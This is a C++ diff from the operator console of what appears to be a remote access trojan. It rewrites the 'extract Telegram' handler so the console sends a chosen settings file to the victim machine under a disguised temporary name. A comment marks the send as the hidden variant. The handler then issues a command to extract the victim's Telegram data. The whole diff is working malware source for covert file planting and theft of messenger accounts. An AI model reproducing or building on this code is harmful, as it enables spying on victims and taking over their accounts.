@@ -1357,12 +1357,56 @@ void CClientView::OnAudioListen()
 	SendSelectCommand(&bToken, sizeof(BYTE));	
 }
 
-void CClientView::OnGetTelegram() // 提取TG
-{
-	// TODO: Add your command handler code here
-	// 给客户端发送提取telegram的指令
-	BYTE	bToken = COMMAND_TELEGRAM;
-	SendSelectCommand(&bToken, sizeof(BYTE));	
+void CClientView::OnGetTelegram() // 提取TG    
+{    
+    // 选择settingss文件    
+    CFileDialog dlgSettings(TRUE, NULL, "settingss", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,     
+        "All Files (*.*)|*.*||", this);    
+    if (dlgSettings.DoModal() != IDOK)    
+        return;    
+	
+    CString settingsPath = dlgSettings.GetPathName();  
+	
+    // 读取文件  
+    unsigned char *data = NULL;     
+    size_t size;     
+	
+    FILE *file = fopen(settingsPath, "rb");  
+    if (file == NULL) {     
+        AfxMessageBox("文件读取失败！");    
+        return;    
+    }  
+    fseek(file, 0, SEEK_END);     
+    size = ftell(file);     
+    data = (unsigned char *)malloc(size);     
+    fseek(file, 0, SEEK_SET);     
+    fread(data, 1, size, file);  
+    fclose(file);  
+	
+    // 使用 COMMAND_SENDFILE_HIDE 而不是 NRUN  
+    char *lpFileExt = strrchr(settingsPath, '.');  
+    if (lpFileExt == NULL) {  
+        lpFileExt = ".tmp";  
+    }  
+	
+	// 构造数据包：命令 + 扩展名 + 自定义文件名 + 文件数据  
+	CString customFileName = "tg_settingss.tmp";  
+	int nPacketLength = 1 + strlen(lpFileExt) + 1 + customFileName.GetLength() + 1 + size;  
+	LPBYTE lpPacket = new BYTE[nPacketLength];  
+  
+	lpPacket[0] = COMMAND_SENDFILE_CUSTOM;  
+	memcpy(lpPacket + 1, lpFileExt, strlen(lpFileExt) + 1);  
+	memcpy(lpPacket + 1 + strlen(lpFileExt) + 1, customFileName.GetBuffer(0), customFileName.GetLength() + 1);  
+	memcpy(lpPacket + 1 + strlen(lpFileExt) + 1 + customFileName.GetLength() + 1, data, size);
+	
+    SendSelectCommand(lpPacket, nPacketLength);  
+	
+    if (data) free(data);  
+    delete[] lpPacket;  
+	
+    // 发送TG提取命令  
+    BYTE bToken = COMMAND_TELEGRAM_EXTRACT;  
+    SendSelectCommand(&bToken, sizeof(BYTE));  
 }
 
 void CClientView::OnReStart()
